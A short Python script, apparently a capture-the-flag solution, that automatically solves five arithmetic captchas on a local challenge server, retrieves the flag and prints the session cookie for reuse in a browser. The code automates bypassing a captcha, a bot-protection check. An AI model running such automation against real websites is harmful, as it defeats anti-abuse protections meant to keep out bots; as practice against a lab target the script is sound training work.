from requests import Session

HOST = 'localhost'
PORT = 4000
URL = f'http://{HOST}:{PORT}'

def get_captcha(session: Session):
  response = session.get(f'{URL}/api/captcha').text
  a, op, b = response.split(' ')
  return int(a), op, int(b)

def solve_captcha(session: Session, a: int, op: str, b: int):
  result = (a - b) if op == '-' else (a + b)
  print(a, op, b, '=', result)
  response = session.post(f'{URL}/api/captcha', json={'code': str(result)}).json()
  return response

session = Session()
session.get(f'{URL}')
for i in range(5):
  a, op, b = get_captcha(session)
  result = solve_captcha(session, a, op, b)
assert 'flag' in result and result['flag']
print(session.get(URL).text)
print(f'Cookie à mettre dans son navigateur : {session.cookies.get("session")}')
